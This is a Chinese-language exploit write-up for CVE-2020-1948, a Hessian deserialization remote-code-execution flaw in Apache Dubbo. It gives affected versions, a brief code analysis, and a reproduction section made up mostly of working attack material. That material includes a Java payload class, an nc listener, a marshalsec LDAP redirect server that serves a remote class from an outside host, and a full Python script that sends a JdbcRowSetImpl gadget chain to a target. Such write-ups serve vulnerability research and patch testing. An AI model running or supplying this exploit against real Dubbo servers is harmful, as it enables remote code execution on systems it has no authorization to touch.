<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2020-1948）Apache Dubbo Hessian 反序列化漏洞</h1><h2>一、漏洞简介</h2><p>攻击者可以发送带有无法识别的服务名或方法名及某些恶意参数负载的RPC请求，当恶意参数被反序列化时将导致代码执行</p><h2>二、漏洞影响</h2><p>2.7.0 &lt;= Apache Dubbo &lt;= 2.7.7</p><p>2.6.0 &lt;= Apache Dubbo &lt;= 2.6.7</p><p>Apache Dubbo 全部 2.5.x 版本</p><h2>三、复现过程</h2><h3>漏洞分析</h3><p>Hessian是一个轻量级的RPC框架。它基于HTTP协议传输，使用Hessian二进制序列化，对于数据包比较大的情况比较友好。<br />使用hession的web项目需要配置web.xml,映射com.caucho.hessian.server.HessianServlet之相应的路径</p><p>1.png</p><p>Java客户端可以很方便的调用服务器上的方法,如下</p><p>2.png</p><p>查看com.caucho.hessian.server.HessianServlet的代码<br />service方法处理客户端发来的http请求,调用</p><p>3.png</p><p>4.png</p><p>调用HessianSkeleton的invoke方法,将从客户端发来的数据流中读取对象</p><p>5.png</p><p>看代码里面好像没有什么黑白名单过滤机制<br />通过抓取请求包,分析,构造请求包,将marshalsec工具生成的Resion payload发送给服务器<br />下面是构造请求包的CVE-2020-1948.py代码</p><p>6.png</p><p>利用图</p><p>7.png</p><p>8.png</p><h3>漏洞复现</h3><h4><em>构造poc</em></h4><p>## exp.java<br />import javax.naming.Context;<br />import javax.naming.Name;<br />import javax.naming.spi.ObjectFactory;<br />import java.util.Hashtable;<br /><br />public class exp {<br />    public exp(){<br />        try {<br />            java.lang.Runtime.getRuntime().exec("calc.exe");<br />        } catch (java.io.IOException e) {<br />            e.printStackTrace();<br />        }<br />    }<br />}</p><p>编译poc</p><p>javac exp.java</p><h4><em>nc监听</em></h4><p>nc -lvvp 12345</p><h4><em>服务器开启web服务，并将生成好的exp.class放置web目录</em></h4><h4><em>启动 LDAP 代理服务</em></h4><p>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://www.0-sec.org/#exp 81</p><p>marshalsec 下载：</p><p>https://download.0-sec.org/download/marshalsec-0.0.3-SNAPSHOT-all.jar</p><h4><em>py脚本测试</em></h4><p>安装依赖包</p><p>pip install dubbo-py</p><p>运行</p><p>python poc.py www.target.com 12345 ldap://www.yourweb:81/exp</p><p>除了通过返回信息来判断外，观察 LDAP 代理是否出现请求转发也是判断POC利用是否成功的重要依据:</p><p># LDAP Refer Server Output<br />Send LDAP reference result for exp redirecting to http://www.0-sec.org/exp.class</p><p># poc.py<br /># -*- coding: utf-8 -*-<br /><br />import sys<br /><br />from dubbo.codec.hessian2 import Decoder,new_object<br />from dubbo.client import DubboClient<br /><br />if len(sys.argv) &lt; 4:<br />  print('Usage: python {} DUBBO_HOST DUBBO_PORT LDAP_URL'.format(sys.argv[0]))<br />  print('\nExample:\n\n- python {} 1.1.1.1 12345 ldap://1.1.1.6:80/exp'.format(sys.argv[0]))<br />  sys.exit()<br /><br />client = DubboClient(sys.argv[1], int(sys.argv[2]))<br /><br />JdbcRowSetImpl=new_object(<br />  'com.sun.rowset.JdbcRowSetImpl',<br />  dataSource=sys.argv[3],<br />  strMatchColumns=["foo"]<br />  )<br />JdbcRowSetImplClass=new_object(<br />  'java.lang.Class',<br />  name="com.sun.rowset.JdbcRowSetImpl",<br />  )<br />toStringBean=new_object(<br />  'com.rometools.rome.feed.impl.ToStringBean',<br />  beanClass=JdbcRowSetImplClass,<br />  obj=JdbcRowSetImpl<br />  )<br /><br />resp = client.send_request_and_return_response(<br />  service_name='org.apache.dubbo.spring.boot.sample.consumer.DemoService',<br />  # 此处可以是 $invoke、$invokeSync、$echo 等，通杀 2.7.7 及 CVE 公布的所有版本。<br />  method_name='$invoke',<br />  args=[toStringBean])<br /><br />output = str(resp)<br />if 'Fail to decode request due to: RpcInvocation' in output:<br />  print('[!] Target maybe not support deserialization.')<br />elif 'EXCEPTION: Could not complete class com.sun.rowset.JdbcRowSetImpl.toString()' in output:<br />   print('[+] Succeed.')<br />else:<br />  print('[!] Output:')<br />  print(output)<br />  print('[!] Target maybe not use dubbo-remoting library.')</p><h2>参考链接</h2><p>https://github.com/DSO-Lab/Dubbo-CVE-2020-1948/wiki</p></body></html>